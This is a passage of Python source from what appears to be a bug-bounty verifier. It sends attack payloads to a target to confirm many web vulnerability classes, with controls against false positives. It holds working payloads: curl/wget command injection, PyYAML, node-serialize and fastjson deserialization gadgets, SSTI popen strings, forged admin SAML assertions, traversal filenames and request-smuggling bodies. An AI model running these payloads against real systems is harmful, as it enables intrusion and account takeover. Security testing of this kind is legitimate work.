            # all three must be 200 record responses — a 3xx/4xx/5xx is not a query result set
            if not (nst == 200 and bst == 200 and bgst == 200 and base and ne):
                continue
            # FP-SAFE superset test: the [$ne] operator must return a RECORD SET that is strictly larger
            # than BOTH the specific match and a no-match control, AND contain the specific match's content
            # (a genuine superset). A mere size change (SSRF/redirect fetching a different URL) does NOT qualify.
            base_bigger_than_bogus = len(base) >= len(bog)            # a real lookup: specific ≥ no-match
            ne_superset = len(ne) > len(base) + 10 and len(ne) > len(bog) + 10
            # structural superset: the operator response should contain tokens the specific response has,
            # plus more records (list/row markers multiply)
            def _rows(s): return len(re.findall(r"<li|<tr|\},\s*\{|\"id\"|\"name\"|\"email\"", s))
            # require a GENUINE multi-record superset: the [$ne] response must have ≥2 record markers and
            # strictly more than both controls. A redirect/SSRF body (0–1 markers) can never satisfy this.
            more_rows = _rows(ne) >= 2 and _rows(ne) > max(_rows(base), _rows(bog))
            if base_bigger_than_bogus and ne_superset and more_rows:
                out({"verified": True, "evidence": f"NoSQLi on '{k}': [$ne] operator returns a strict record SUPERSET (specific {len(base)}B/{_rows(base)} rows · no-match {len(bog)}B · [$ne] {len(ne)}B/{_rows(ne)} rows) — input evaluated as a Mongo query operator, not a literal", "method": "nosqli_operator"})
        out({"verified": False, "evidence": "operator injection produced no genuine record-superset divergence (size-only changes are not claimed)", "method": "nosqli_operator"})

    # ── CRLF / HTTP header injection ──────────────────────────────────────────
    elif CLS in ("crlf", "crlf_injection", "header_injection", "response_splitting"):
        marker = "HUNTRCRLF1337"
        for i in params_to_test(qs):
            k = qs[i][0]
            for enc in ["%0d%0a" + marker + ": injected", "%0D%0A" + marker + ": injected", "\r\n" + marker + ": injected", "%E5%98%8A%E5%98%8D" + marker + ": injected"]:
                _, st, hdrs = fetch(inject(parts, qs, i, qs[i][1] + enc), follow_redirects=False)
                # A real response-splitting bug injects a brand-new header LINE, so the marker must
                # appear as its own header KEY. Matching key+value together (the old behavior)
                # false-positived on any page that reflects the query string back verbatim inside an
                # EXISTING header's value (e.g. Location on a redirect) — there the %0d%0a stays
                # percent-encoded text inside that header's value, never becomes a real injected
                # header, and is harmless. Verified live against www.otto.de 2026-10-17: 5/5 "CRLF
                # confirmed" findings were exactly this — marker only ever inside Location's value.
                if any(marker.lower() in str(hk).lower() for hk, hv in (hdrs or {}).items()):
                    out({"verified": True, "evidence": f"CRLF on '{k}': injected header '{marker}' appears as its own response header — HTTP response splitting / header injection", "method": "crlf_header"})
        out({"verified": False, "evidence": "no injected header reflected — CRLF filtered", "method": "crlf_header"})

    # ── Host header injection / password-reset poisoning ──────────────────────
    elif CLS in ("host-header", "host_header", "host_header_injection"):
        evil = "evil-huntr-verify.com"
        body, st, hdrs = fetch(URL, extra_headers={"Host": evil, "X-Forwarded-Host": evil}, follow_redirects=False)
        loc = (hdrs or {}).get("location", "")
        # A Location-header reflection is unambiguous (it IS where the client goes next). A body
        # reflection is only meaningful if it lands inside a URL/link a client would actually follow
        # — see meaningful_reflection(). Bare "the string appears somewhere in the page" (e.g. an
        # error message quoting the Host we sent) is NOT evidence of an exploitable sink.
        if evil in loc:
            out({"verified": True, "evidence": f"Host-header injection: attacker Host '{evil}' is reflected in the response Location header — enables redirect/OAuth hijack", "method": "host_header_reflected"})
        if meaningful_reflection(evil, (body or "")[:4000]):
            out({"verified": True, "evidence": f"Host-header injection: attacker Host '{evil}' is reflected into a URL/link in the response body — enables cache poisoning / reset-link hijack", "method": "host_header_reflected"})
        out({"verified": False, "evidence": "attacker Host not reflected in a usable sink (Location or a URL/link) — host header validated or only echoed as inert text", "method": "host_header_reflected"})

    # ── Web cache poisoning — unkeyed input reflected + cacheable ─────────────
    elif CLS in ("cache-poison", "cache_poisoning", "cache-poisoning"):
        evil = "evil-huntr-verify.com"
        b1, _, h1 = fetch(URL, extra_headers={"X-Forwarded-Host": evil})
        # same fix as the host-header oracle: a bare substring match on the whole body false-positives
        # on harmless mentions (e.g. an error page quoting the Host back). Require it in a usable
        # URL/link sink — see meaningful_reflection().
        reflected = meaningful_reflection(evil, (b1 or "")[:6000])
        cacheable = any("cache" in str(hk).lower() and ("hit" in str(hv).lower() or "public" in str(hv).lower() or "max-age" in str(hv).lower()) for hk, hv in (h1 or {}).items())
        if reflected and cacheable:
            out({"verified": True, "evidence": "cache poisoning: unkeyed X-Forwarded-Host reflected into a cacheable response — a poisoned entry serves the attacker payload to other users", "method": "cache_unkeyed_reflect"})
        out({"verified": False, "evidence": ("unkeyed header reflected but response not obviously cacheable" if reflected else "unkeyed header not reflected"), "method": "cache_unkeyed_reflect"})

    # ── Clickjacking — missing frame protections ──────────────────────────────
    elif CLS in ("clickjack", "clickjacking", "ui_redress"):
        _, st, hdrs = fetch(URL)
        xfo = (hdrs or {}).get("x-frame-options", "")
        csp = (hdrs or {}).get("content-security-policy", "")
        framable = not xfo and "frame-ancestors" not in csp.lower()
        if st == 200 and framable:
            out({"verified": True, "evidence": "clickjacking: no X-Frame-Options and no CSP frame-ancestors — the page can be framed on an attacker site", "method": "clickjack_missing_headers"})
        out({"verified": False, "evidence": f"frame protection present (XFO='{xfo}', frame-ancestors in CSP={('yes' if 'frame-ancestors' in csp.lower() else 'no')})", "method": "clickjack_missing_headers"})

    # ── CSRF — state-change without token/SameSite ────────────────────────────
    elif CLS in ("csrf", "xsrf"):
        body, _, hdrs = fetch(URL)
        sc = " ".join(str(v) for k, v in (hdrs or {}).items() if str(k).lower() == "set-cookie")
        # The evidence text claims "no anti-CSRF token IN THE FORM" — that premise requires a form
        # to actually exist. Without this, a GET-only informational page with no <form> at all (has_
        # token trivially False, since there's no token to find) and a cookie that merely omits an
        # EXPLICIT SameSite attribute (common — many sites rely on the browser's modern SameSite=Lax
        # default rather than setting it explicitly) would auto-confirm "forge the request" with
        # nothing to forge.
        has_form = bool(re.search(r'<form\b', body or "", re.I))
        has_token = bool(re.search(r'csrf|xsrf|authenticity_token|__requestverificationtoken', body or "", re.I))
        samesite = "samesite=strict" in sc.lower() or "samesite=lax" in sc.lower()
        if has_form and not has_token and not samesite:
            out({"verified": True, "evidence": "CSRF: a <form> is present with no anti-CSRF token and session cookie lacks SameSite — a cross-site form can forge the request", "method": "csrf_no_token"})
        out({"verified": None, "evidence": f"CSRF signals present (form={has_form}, token={has_token}, SameSite={samesite}) — confirm against a state-changing action", "method": "csrf_no_token"})

    # ── Blind OOB classes (cmdi / rce / xxe / blind-ssti) via interactsh OAST ─
    elif CLS in ("rce", "cmdi", "command_injection", "command-injection", "xxe", "blind-ssti", "blind_ssti",
                 "ssti-rce", "deserialization", "deserialisation", "insecure-deserialization", "deser"):
        try:
            _os = importlib.import_module("oast")
            o = _os.OAST()
        except Exception:
            o = None
        # LOCAL-LISTENER FALLBACK: when interactsh has no outbound (sandbox) OR the target can reach this
        # machine (localhost labs, SSRF-adjacent targets), a local HTTP collaborator catches the callback.
        # This is how blind cmdi/rce/xxe get PROVEN deterministically without public OAST egress.
        import http.server as _hs, socketserver as _ss, threading as _th, socket as _sock, uuid as _uuid, time as _t2
        _local_hits = []
        class _LH(_hs.BaseHTTPRequestHandler):
            def do_GET(self): _local_hits.append(self.path); self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
            def log_message(self, *a): pass
        try:
            _lsrv = _ss.TCPServer(("0.0.0.0", 0), _LH); _lsrv.timeout = 1
            _lport = _lsrv.server_address[1]
            _th.Thread(target=_lsrv.serve_forever, daemon=True).start()
            try: _lhost = os.environ.get("HUNTR_OAST_HOST") or _sock.gethostbyname(_sock.gethostname())
            except Exception: _lhost = "127.0.0.1"
            _ltok = _uuid.uuid4().hex[:12]
            _cb_locals = [f"http://{_lhost}:{_lport}/{_ltok}", f"http://127.0.0.1:{_lport}/{_ltok}"]
        except Exception:
            _lsrv = None; _cb_locals = []; _ltok = ""
        if not (o and o.ready) and not _cb_locals:
            out({"verified": None, "evidence": "OOB class needs a collaborator (interactsh unavailable + no local listener) — manual confirmation", "method": "oast_unavailable"})
        cb, tok = (o.url("hx" + str(abs(hash(URL)) % 99999)) if (o and o.ready) else (_cb_locals[0], _ltok))
        host = cb.replace("http://", "")
        # class-specific payloads that force an outbound DNS/HTTP to our callback if the sink fires
        # build payloads for EVERY callback URL we have (interactsh + the local listener)
        _cbs = ([cb] if (o and o.ready) else []) + _cb_locals
        payloads = []
        for _c in _cbs:
            _h = _c.replace("http://", "")
            if CLS in ("rce", "cmdi", "command_injection", "command-injection"):
                payloads += [";curl " + _c, "|curl " + _c, "$(curl " + _c + ")", "`curl " + _c + "`", ";nslookup " + _h, "&&curl " + _c, ";wget -q -O- " + _c]
            elif CLS in ("xxe",):
                payloads += ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "' + _c + '">]><r>&x;</r>']
            elif CLS in ("deserialization", "deserialisation", "insecure-deserialization", "deser"):
                # unsafe deserializers that evaluate on load → outbound callback proves code exec.
                # Ruby/Python/Node YAML & JSON sinks that execute a system() during object construction.
                payloads += [
                    "!!python/object/apply:os.system ['curl " + _c + "']",                      # PyYAML
                    "--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\n  io: !ruby/object:Net::BufferedIO { io: !ruby/object:Gem::RequestSet {} }",  # Ruby marker
                    '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'curl ' + _c + "')}()\"}",  # node-serialize
                    '{"@type":"java.net.InetAddress","val":"' + _h.split(":")[0] + '"}',          # fastjson DNS
                    '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"' + _c.replace("http", "ldap") + '","autoCommit":true}',  # fastjson JNDI
                ]
            else:  # blind ssti → rce
                payloads += ["${T(java.lang.Runtime).getRuntime().exec('curl " + _c + "')}", "#{'curl " + _c + "'}",
                             "{{config.__class__.__init__.__globals__['os'].popen('curl " + _c + "').read()}}"]
        for pay in payloads:
            if qs:
                for i in params_to_test(qs):
                    fetch(inject(parts, qs, i, pay))
            # deserialization sinks usually read the raw request BODY, not a query param
            if CLS in ("deserialization", "deserialisation", "insecure-deserialization", "deser"):
                ct = "application/json" if pay.lstrip().startswith(("{", "[")) else "text/plain"
                req(URL, method="POST", body=pay, extra_headers={"Content-Type": ct})
            elif not qs:
                fetch(URL + ("&" if parts.query else "?") + "x=" + urllib.parse.quote(pay))
        import time as _t3; _t3.sleep(1.0)   # let any outbound callback land
        hits = (o.poll(tok, wait=18) if (o and o.ready) else [])
        if _ltok and any(_ltok in h for h in _local_hits):
            hits = (hits or []) + [h for h in _local_hits if _ltok in h]
        try:
            if _lsrv: _lsrv.shutdown()
        except Exception: pass
        try:
            if o and o.ready: o.stop()
        except Exception: pass
        if hits:
            _via = "local OAST collaborator" if (_ltok and any(_ltok in str(h) for h in hits)) else "interactsh"
            out({"verified": True, "evidence": f"{CLS.upper()} PROVEN: the server made an out-of-band callback to our {_via} ({len(hits)} interaction(s), token {tok or _ltok}) after injection — blind code/command execution confirmed", "method": "oast_callback"})
        out({"verified": False, "evidence": "no interactsh callback after injection — payload did not execute out-of-band", "method": "oast_callback"})

    # ── Server-side PROTOTYPE POLLUTION ─────────────────────────────────────────
    elif CLS in ("prototype-pollution", "prototype_pollution", "proto-pollution", "proto_pollution"):
        import uuid as _uu
        marker = "hpp" + _uu.uuid4().hex[:6]
        # Gadget 1: status-code override — pollute __proto__[status]; a vulnerable merge makes the app
        # echo that status on a FOLLOW-UP clean request. Gadget 2: reflected-property — pollute a unique
        # key and see it surface in a JSON response where the client never sent it.
        base_b, base_s, _ = req(URL)
        hdrs = {"Content-Type": "application/json"}
        req(URL, method="POST", body=json.dumps({"__proto__": {"status": 509, marker: marker}}), extra_headers=hdrs)
        req(URL, method="POST", body=json.dumps({"constructor": {"prototype": {marker: marker}}}), extra_headers=hdrs)
        chk_b, chk_s, _ = req(URL)
        if chk_s == 509 and base_s != 509:
            out({"verified": True, "evidence": f"prototype pollution: __proto__[status]=509 polluted a shared object — a later clean request now returns HTTP 509 (was {base_s})", "method": "pp_status_gadget"})
        if marker in chk_b and marker not in base_b:
            out({"verified": True, "evidence": f"prototype pollution: injected __proto__ key '{marker}' now appears in a response the client never seeded it into", "method": "pp_reflected_key"})
        out({"verified": False, "evidence": "no prototype-pollution gadget fired (status/ reflected-key unchanged)", "method": "pp"})

    # ── WEB CACHE DECEPTION ──────────────────────────────────────────────────────
    elif CLS in ("web-cache-deception", "web_cache_deception", "wcd", "cache-deception"):
        base_b, base_s, base_h = req(URL)
        marker = None
        # a private page usually carries a per-user token/email/csrf — pick a stable private signal
        m = re.search(r'(csrf[\w-]*["\s:=]+[\w-]{8,}|[\w.+-]+@[\w.-]+\.\w+|balance|api[_-]?key|session)', base_b, re.I)
        if m:
            marker = m.group(0)[:40]
        # append a static-looking suffix the cache keys on but the app ignores
        p = urllib.parse.urlparse(URL)
        for suffix in ("/nonexistent.css", ";.css", "%2e%2ecss", "/x.js"):
            trick = urllib.parse.urlunparse(p._replace(path=p.path.rstrip("/") + suffix))
            b1, s1, h1 = req(trick); b2, s2, h2 = req(trick)
            cc = (h1.get("cache-control", "") + h1.get("cf-cache-status", "") + h1.get("x-cache", "")).lower()
            cacheable = ("public" in cc or "max-age" in cc or "hit" in cc) and "no-store" not in cc and "private" not in cc
            # Only the marker branch actually proves PRIVATE content was served — "byte-identical to
            # baseline" (the old no-marker fallback) proves nothing about sensitivity at all: it's
            # satisfied by any SPA's catch-all fallback routing serving the same index.html for every
            # unmatched path, which is common and totally benign, not an information leak. Without a
            # real private-data marker there's nothing here to confirm "private" against.
            served_private = s1 == 200 and marker and marker in b1
            if served_private and cacheable:
                out({"verified": True, "evidence": f"web cache deception via '{suffix}': the private page is returned AND marked cacheable ({cc.strip()[:60]}) — a shared cache would store it for other users", "method": "wcd_cacheable_private"})
        out({"verified": False, "evidence": "no WCD: static-suffix variants were not both private AND cacheable", "method": "wcd"})

    # ── MASS ASSIGNMENT ──────────────────────────────────────────────────────────
    elif CLS in ("mass-assignment", "mass_assignment", "autobinding", "overposting"):
        hdrs = {"Content-Type": "application/json"}
        priv = {"isAdmin": True, "is_admin": True, "role": "admin", "admin": True, "verified": True, "account_balance": 999999}
        for meth in ("PUT", "POST", "PATCH"):
            b, s, _ = req(URL, method=meth, body=json.dumps(priv), extra_headers=hdrs)
            if s in (200, 201):
                # proven ONLY if the server ECHOES a privileged field back as accepted (not silent)
                for k, v in priv.items():
                    pat = re.compile(r'"%s"\s*:\s*(true|"?admin"?|999999)' % re.escape(k), re.I)
                    if pat.search(b):
                        out({"verified": True, "evidence": f"mass assignment ({meth}): server accepted and echoed privileged field '{k}'={v} that a client must not set", "method": "mass_assign_echo"})
        out({"verified": False, "evidence": "no privileged field was accepted+echoed on PUT/POST/PATCH", "method": "mass_assignment"})

    # ── LDAP INJECTION ───────────────────────────────────────────────────────────
    elif CLS in ("ldap", "ldap-injection", "ldap_injection"):
        if not qs:
            out({"verified": None, "evidence": "no query parameter to test for LDAP injection", "method": "ldap"})
        for i in params_to_test(qs):
            base_b, _, _ = req(inject(parts, qs, i, "huntr_" + "nosuchuser123"))
            star_b, _, _ = req(inject(parts, qs, i, "*"))
            inj_b, _, _ = req(inject(parts, qs, i, "*)(uid=*))(|(uid=*"))
            # wildcard / filter-break returns MORE than a specific miss → injectable LDAP filter
            if len(star_b) > len(base_b) + 20 and len(inj_b) > len(base_b) + 20:
                out({"verified": True, "evidence": f"LDAP injection on '{qs[i][0]}': '*' and filter-break '*)(uid=*)' both enlarge the result set vs a specific miss ({len(base_b)}B→{len(star_b)}B) — input reaches the LDAP filter", "method": "ldap_wildcard_diff"})
        out({"verified": False, "evidence": "LDAP metacharacters did not change the result set", "method": "ldap"})

    # ── XPATH INJECTION ──────────────────────────────────────────────────────────
    elif CLS in ("xpath", "xpath-injection", "xpath_injection"):
        if not qs:
            out({"verified": None, "evidence": "no query parameter to test for XPath injection", "method": "xpath"})
        for i in params_to_test(qs):
            base_b, _, _ = req(inject(parts, qs, i, "huntr_nosuch123"))
            t_b, _, _ = req(inject(parts, qs, i, "' or '1'='1"))
            f_b, _, _ = req(inject(parts, qs, i, "' and '1'='2"))
            if len(t_b) > len(base_b) + 20 and len(t_b) > len(f_b) + 20:
                out({"verified": True, "evidence": f"XPath injection on '{qs[i][0]}': \"' or '1'='1\" returns the full node-set while \"'1'='2\" returns none — boolean XPath control confirmed", "method": "xpath_boolean"})
        out({"verified": False, "evidence": "XPath boolean payloads produced no divergence", "method": "xpath"})

    # ── CSP WEAKNESS (XSS-enabling) ──────────────────────────────────────────────
    elif CLS in ("csp", "csp-bypass", "csp_bypass", "weak-csp"):
        _, _, h = req(URL)
        csp = h.get("content-security-policy", "") or h.get("content-security-policy-report-only", "")
        if not csp:
            # absence of CSP is defense-in-depth INFO, not a reproduced vulnerability — never a standalone finding
            out({"verified": None, "evidence": "no Content-Security-Policy header (defense-in-depth gap, not a standalone vuln)", "method": "csp_absent"})
        low = csp.lower()
        sdir = ""
        for d in low.split(";"):
            d = d.strip()
            if d.startswith("script-src") or (not sdir and d.startswith("default-src")):
                sdir = d
        has_nonce = "nonce-" in low or "'strict-dynamic'" in low or "sha256-" in low
        if "'unsafe-inline'" in sdir and not has_nonce:
            out({"verified": True, "evidence": f"CSP allows inline script with no nonce/hash ('{sdir[:70]}') — an injected <script> executes despite CSP", "method": "csp_unsafe_inline"})
        if re.search(r"script-src[^;]*(\*|https?:(?!//)|\bdata:)", low) and not has_nonce:
            out({"verified": True, "evidence": f"CSP script-src uses a wildcard/scheme source ('{sdir[:70]}') — script can be loaded from attacker-controlled origins", "method": "csp_wildcard"})
        out({"verified": False, "evidence": f"CSP present and restrictive ('{csp[:80]}')", "method": "csp"})

    # ── OAUTH / OIDC redirect_uri hijack ─────────────────────────────────────────
    elif CLS in ("oauth", "oidc", "oauth-redirect", "oauth_redirect_uri"):
        ru_keys = [k for (k, _) in qs if k.lower() in ("redirect_uri", "redirect", "callback", "return_uri", "reply_url")]
        if not ru_keys:
            out({"verified": None, "evidence": "no redirect_uri-style parameter present on this authorize URL", "method": "oauth"})
        evil = "https://huntr-oauth-evil.example"
        for i, (k, _) in enumerate(qs):
            if k.lower() not in ("redirect_uri", "redirect", "callback", "return_uri", "reply_url"):
                continue
            b, s, h = req(inject(parts, qs, i, evil + "/cb"), follow_redirects=False)
            loc = h.get("location", "")
            if s in (301, 302, 303, 307, 308) and loc.startswith(evil):
                out({"verified": True, "evidence": f"OAuth redirect_uri not validated: authorize endpoint 302s to attacker '{loc[:70]}' — the authorization code/token is delivered to the attacker (account takeover)", "method": "oauth_open_redirect_uri"})
        out({"verified": False, "evidence": "authorize endpoint did not redirect the auth response to an attacker redirect_uri", "method": "oauth"})

    # ── WEBSOCKET cross-site hijacking (CSWSH) ───────────────────────────────────
    elif CLS in ("websocket", "cswsh", "ws", "websocket-hijack"):
        import socket as _sk, base64 as _b64, os as _o
        p = urllib.parse.urlparse(URL)
        host = p.hostname; port = p.port or (443 if p.scheme in ("wss", "https") else 80)
        if p.scheme in ("wss", "https"):
            out({"verified": None, "evidence": "wss/TLS WebSocket handshake check not implemented in the raw oracle — test over ws:// or confirm manually", "method": "cswsh_tls"})
        key = _b64.b64encode(_o.urandom(16)).decode()
        path = p.path or "/"
        hs = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
              f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\nOrigin: https://huntr-evil.example\r\n\r\n")
        try:
            s = _sk.create_connection((host, port), timeout=TIMEOUT); s.sendall(hs.encode())
            resp = s.recv(4096).decode("utf-8", "ignore"); s.close()
            if "101" in resp.split("\r\n")[0] and "switching protocols" in resp.lower():
                out({"verified": True, "evidence": "cross-site WebSocket hijacking: handshake from Origin https://huntr-evil.example was accepted (101 Switching Protocols) — the server does not validate Origin on the WS upgrade", "method": "cswsh_origin_accepted"})
            out({"verified": False, "evidence": f"WS upgrade with attacker Origin was NOT accepted ({resp.split(chr(10))[0][:60]})", "method": "cswsh"})
        except Exception as _e:
            out({"verified": None, "evidence": f"WebSocket handshake could not complete: {str(_e)[:80]}", "method": "cswsh"})

    # ── FILE UPLOAD / path-traversal (zip-slip) ──────────────────────────────────
    elif CLS in ("file-upload", "file_upload", "upload", "zip-slip", "zip_slip"):
        import uuid as _uu
        marker = "huntrup" + _uu.uuid4().hex[:8]
        boundary = "----huntr" + _uu.uuid4().hex[:10]
        trav_name = "../../../tmp/" + marker + ".txt"
        parts_body = (
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{trav_name}\"\r\n"
            f"Content-Type: text/plain\r\n\r\n{marker}-CONTENT\r\n--{boundary}--\r\n")
        b, s, h = req(URL, method="POST", body=parts_body, extra_headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        # proof: the server stored our file under the traversed path and serves it back
        p = urllib.parse.urlparse(URL); origin = f"{p.scheme}://{p.netloc}"
        for probe in (f"/tmp/{marker}.txt", f"/files/{marker}.txt", f"/uploads/{marker}.txt", f"/{marker}.txt"):
            pb, ps, _ = req(origin + probe)
            if ps == 200 and marker + "-CONTENT" in pb:
                out({"verified": True, "evidence": f"file-upload path traversal (zip-slip): a file named '{trav_name}' was written outside the upload dir and is retrievable at {probe}", "method": "upload_traversal"})
        if (marker + "-CONTENT") in b and s in (200, 201):
            out({"verified": None, "evidence": "upload accepted with a traversal filename, but the stored path could not be confirmed retrievable — verify manually", "method": "upload_accepted"})
        out({"verified": False, "evidence": "traversal-named upload was rejected or not retrievable", "method": "file_upload"})

    # ── HTTP REQUEST SMUGGLING (conservative, timing differential) ────────────────
    elif CLS in ("request-smuggling", "request_smuggling", "smuggling", "desync"):
        import socket as _sk, ssl as _ssl, time as _tm
        p = urllib.parse.urlparse(URL)
        host = p.hostname; is_tls = p.scheme == "https"; port = p.port or (443 if is_tls else 80)
        def _open():
            raw = _sk.create_connection((host, port), timeout=8)
            if is_tls:
                ctx = _ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = _ssl.CERT_NONE
                return ctx.wrap_socket(raw, server_hostname=host)
            return raw
        # DIFFERENTIAL CL.TE desync: an incomplete chunk makes a desync-vulnerable front-end wait for the
        # rest of the body. Compare the stall of the ATTACK request against a well-formed CONTROL request
        # to the same host — only a stall that is BOTH long AND far exceeds the control is claimed (zero-FP).
        path = p.path or "/"
        attack = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\n"
                  f"Transfer-Encoding: chunked\r\n\r\n1\r\nA\r\nX").encode()
        control = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
        def _timed(payload):
            try:
                t0 = _tm.time(); s = _open(); s.sendall(payload); s.settimeout(7)
                try: s.recv(256)
                except Exception: pass
                s.close(); return _tm.time() - t0
            except Exception:
                return None
        try:
            base = _timed(control); atk = _timed(attack)
            if base is None or atk is None:
                out({"verified": None, "evidence": "smuggling probe could not complete a connection", "method": "smuggling"})
            # strong, reproducible stall AND a clear differential over the control → desync
            if atk > 5 and atk > base + 4:
                out({"verified": True, "evidence": f"HTTP request smuggling (CL.TE{' over TLS' if is_tls else ''}): the chunked/CL-conflicting request stalled {atk:.1f}s vs a {base:.1f}s control — front-end/back-end disagree on body length (desync)", "method": "smuggling_cl_te_timing"})
            out({"verified": None, "evidence": f"no clear desync differential (attack {atk:.1f}s vs control {base:.1f}s) — route to the differential agent/Burp to confirm safely", "method": "smuggling_inconclusive"})
        except Exception as _e:
            out({"verified": None, "evidence": f"smuggling probe error: {str(_e)[:80]}", "method": "smuggling"})

    # ── SAML / XSW — real signature-wrapping attempt when fed a captured assertion ────
    elif CLS in ("saml", "xsw", "saml-xsw", "signature-wrapping"):
        import base64 as _b64, uuid as _uu
        # the agent passes a captured signed SAMLResponse (base64 or raw XML) + the victim NameID via --detail
        raw = DETAIL or ""
        m = re.search(r"SAMLResponse=?([A-Za-z0-9+/=%]{80,})", raw) or re.search(r"(PHNhbW[A-Za-z0-9+/=]{80,})", raw)
        xml = None
        if m:
            try:
                xml = _b64.b64decode(urllib.parse.unquote(m.group(1))).decode("utf-8", "ignore")
            except Exception:
                xml = None
        if not xml and "<saml" in raw.lower():
            xml = raw
        if not xml:
            b, _, _ = req(URL)
            detected = bool(re.search(r"SAMLRequest|SAMLResponse|urn:oasis:names:tc:SAML|<saml[p]?:", b, re.I))
            out({"verified": None, "evidence": ("SAML endpoint detected — " if detected else "") +
                 "XSW needs a captured SIGNED assertion + the ACS URL; re-run with --detail '<SAMLResponse b64>' and --url <ACS> (the auth agent captures these from a real SSO login)", "method": "saml_detected" if detected else "saml"})
        # build classic XSW variants: keep the SIGNED assertion but add a FORGED one the app reads instead
        forged_id = "_huntr" + _uu.uuid4().hex[:12]
        evil_nameid = "admin@huntr-xsw.test"
        def _forged_assertion():
            return (f'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="{forged_id}" '
                    f'Version="2.0" IssueInstant="2099-01-01T00:00:00Z"><saml:Subject><saml:NameID>{evil_nameid}'
                    f'</saml:NameID></saml:Subject><saml:AttributeStatement><saml:Attribute Name="role">'
                    f'<saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion>')
        variants = []
        # XSW: forged assertion as a sibling placed BEFORE the signed one (parsers that read the first win)
        variants.append(re.sub(r"(<saml:?Assertion\b)", _forged_assertion() + r"\1", xml, count=1))
        # XSW: wrap the original signed assertion inside an Extensions block, forged one at top level
        if "<samlp:Response" in xml or "<Response" in xml:
            variants.append(re.sub(r"(</saml[p]?:Response>|</Response>)",
                                   _forged_assertion() + r"\1", xml, count=1))
        acs = URL
        for v in variants:
            enc = _b64.b64encode(v.encode()).decode()
            body = "SAMLResponse=" + urllib.parse.quote(enc)
            rb, rs, rh = req(acs, method="POST", body=body, extra_headers={"Content-Type": "application/x-www-form-urlencoded"}, follow_redirects=False)
            # acceptance signal: a session cookie is actually set. The old condition also accepted
            # ANY 301/302/303 whose Location merely didn't contain "error"/"login"/"fail"/"denied" —
            # far too weak for a CRITICAL auth-bypass claim: a REJECTED SAML response commonly also
            # 302s (e.g. back to a generic SSO landing page whose URL doesn't happen to contain any
            # of those words). A real cookie named like a session/auth token is actual proof the SP
            # treated this as an authenticated request; a bare redirect is not.
            authed = "set-cookie" in rh and re.search(r"(session|sid|auth|token)", rh.get("set-cookie", ""), re.I)
            if authed:
                out({"verified": True, "evidence": f"SAML signature wrapping (XSW): the SP accepted a response carrying a FORGED assertion (NameID {evil_nameid}, role=admin) alongside the untouched signed one — authentication bypass / identity spoofing", "method": "saml_xsw_accepted"})
        out({"verified": None, "evidence": "XSW variants submitted but the SP did not visibly accept the forged assertion (no auth cookie set) — may need a different wrapping position; confirm with the auth agent", "method": "saml_xsw_inconclusive"})

    # ── DNS REBINDING — needs rebinding infra; never auto-claimed ─────────────────
    elif CLS in ("dns-rebinding", "dns_rebinding", "rebinding"):
        out({"verified": None, "evidence": "DNS rebinding requires a controlled rebinding DNS server (TTL-0 A-record flip) — not provable from a single process; route to OAST/agent infra", "method": "dns_rebinding_infra"})

    elif CLS in ("race", "race_condition", "logic", "ato", "business_logic"):
        out({"verified": None,
             "evidence": f"class '{CLS}' cannot be safely auto-verified — manual confirmation required",
             "method": "manual_required"})

    # ── Unknown class ─────────────────────────────────────────────────────────
    else:
        out({"verified": None,
             "evidence": f"no verifier for class '{CLS}' — manual review",
             "method": "unverifiable"})

except Exception as e:
    out({"verified": None, "evidence": f"verifier error: {e}", "method": "error"})
